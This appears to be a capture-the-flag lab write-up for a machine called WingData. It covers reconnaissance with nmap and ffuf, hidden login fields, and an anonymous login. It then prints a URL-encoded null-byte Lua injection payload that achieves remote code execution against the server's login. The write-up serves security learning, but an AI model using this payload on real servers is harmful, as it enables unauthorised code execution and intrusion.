## Machine WingData (Active) 


- first we run an nmap scan : 
```
❯ nmap -sC -sV 10.129.7.191
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-16 22:55 +0100
Nmap scan report for wingdata.htb (10.129.7.191)
Host is up (0.28s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: WingData Solutions
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.09 seconds
```
- first of all theres an ssh port , and a web port, we dont have credentials for the ssh, so let's check the web page.
- Theres nothing really ineteresting in the page except for the "client portal" which leads to a login page "ftp.wingdata.htb/login.html"
```
❯ ffuf -u http://FUZZ.wingdata.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.wingdata.htb" -s
===========================
ftp

```
-so we found that ftp is the only subdomain.

- time for some burpsuite and testing (to get an idea of how their login works)
![alt text](image.png)
so this is how the login flow works, there's something quite interesting, username_val and password_val, im not quite sure whats the point from it but let's keep it in mind just in case.

- I was stuck for like 20 minutes and i was reading the html and js code from the browser and i found something really interesting :
  ![alt text](image-1.png)
  hidden input fields ;0
  lets make them shown and test them\
  there they are !
  ![alt text](image-2.png)
  lets test the request now
  well its the hidden ones that resemble the username_val and password_val , and guess what , they're the ones actually tested. 


  - let's ignore that i was stuck there for another 20 minutes, I tried to think out of the box, and look what i found !
  ![alt text](image-3.png)
  this exact version had a recent RCE vulnerability, let's try to use it

  well from what i read , i understand that to use the exploit u have to have Anonymous login enabled, and its quite easy, use this payload : ``` username=anonymous&password=&remember=true``` \
  and fr it did log me in this time !

  alright, now lets test a login payload from the rce cve: 
    ``` username=anonymous%00]]%0dlocal%20h%20%3d%20io.popen(%22id%22)%0dlocal%20r%20%3d%20h%3aread(%22*a%22)%0dh%3aclose()%0dprint(r)%0d--&password=&remember=true ```
    (url encoded)

    its working !
    ![alt text](image-4.png)
    now (from what i read from this cve documentation, we shall check /dir.html for possible code execution (while using the same cookie -UID))
    ![alt text](image-5.png)

    HELL YEAH, its working. we can see the output of our lua code (```io.popen("id")```) \
    alright, lets get a shell !
    